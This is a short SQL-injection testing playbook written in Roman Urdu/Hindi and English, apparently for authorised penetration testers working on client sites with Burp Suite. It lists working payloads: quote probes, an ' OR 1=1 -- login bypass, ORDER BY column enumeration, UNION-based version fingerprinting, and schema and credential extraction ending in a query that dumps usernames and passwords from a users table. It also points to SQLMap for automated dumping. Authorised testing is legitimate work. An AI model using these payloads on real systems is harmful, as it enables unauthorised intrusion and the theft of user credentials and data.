### Real-World SQL Injection Testing 

Jab bhi kisi real target / client site par SQL Injection test karni ho, toh step-by-step is Playbook ko follow karein:
#### Step 1: Target Identification & Scope Check
 * Target scope verify karein. Burp Suite Intercept ON karke target website browse karein taake saari requests **HTTP History** mein log ho jayein.
#### Step 2: Testing Order & Methodology (Priority Matrix)
**Phase A: URL Parameters (GET Requests)**
 * **Target:** [https://example.com/item.php?id=10&cat=2](https://example.com/item.php?id=10&cat=2)
 * **Action:** Request ko Burp **Repeater** mein bhejein.
 * **Initial Test:** Parameter ke aage ' (single quote) ya " (double quote) daal kar Send karein.
 * **Observe:**
   * Agar 500 Internal Server Error, SQL Syntax Error, ya Page Content badal jaye ➔ **SQLi Found!** Direct **Step 3 (Extraction)** par jayein.
   * Agar koi farq na pade (200 OK) ➔ Next Parameter par jayein.
**Phase B: Form & Body Parameters (POST Requests)**
 * **Target:** Login forms, Search bars, Contact Us forms, Comment boxes (username=admin&password=123).
 * **Action:** Repeater mein ' aur " daal kar test karein.
 * **Observe:** Response behavior check karein. Login form par Authentication Bypass logic (' OR 1=1 -- ) try karein.
**Phase C: HTTP Headers (Cookie & Header Parameters)**
 * **Target:** Cookie: session=xyz, User-Agent: Mozilla/5.0, Referer: https://...
 * **Action:** Header values ke aage single quote (') inject karein.
 * **Observe:** Agar server log save karte waqt crash ho ➔ Header-based SQLi Found!
#### Step 3: Exploitation & Data Extraction (Jab Vulnerability Mil Jaye)
Jab kisi **EK** parameter (maslan id ya Cookie) par behavior broken confirm ho jaye, toh baaqi headers/parameters ko chhor kar **sirf us specific parameter** par data extract karein:
 1. **Column Count Enumeration:**
   * Burp Intruder ya Repeater mein run karein:
     1' ORDER BY 1 -- 
     1' ORDER BY 2 -- 
     1' ORDER BY 3 -- 
     *(Jahan error aaye, us se pehle wala number aap ka total column count hai).*
 2. **DBMS Fingerprinting (Database Detect Karein):**
   * MySQL: 1' UNION SELECT 1, version() -- 
   * MSSQL: 1' UNION SELECT 1, @@version -- 
   * PostgreSQL: 1' UNION SELECT 1, version() -- 
 3. **Schema Extraction (Databases, Tables & Columns):**
   * Database Name: 1' UNION SELECT 1, database() -- 
   * Tables List: 1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() -- 
   * Columns List: 1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' -- 
   * Data Dump: 1' UNION SELECT user, password FROM users -- 
*(Note: Manual exploitation ki jagah confirm point milne ke baad aap active cookie pass karke **SQLMap** se automation extraction bhi kar sakte hain).*
#### Step 4: Exit Rule (Agar Vulnerability Na Mile)
 * Agar GET parameters, POST forms, aur HTTP Headers teeno test karne ke baad bhi koi delay, error, ya logic change na ho, toh target parameter/page **Secured** hai. Next vulnerability category (XSS, CSRF, Access Control) par shift ho jayein.
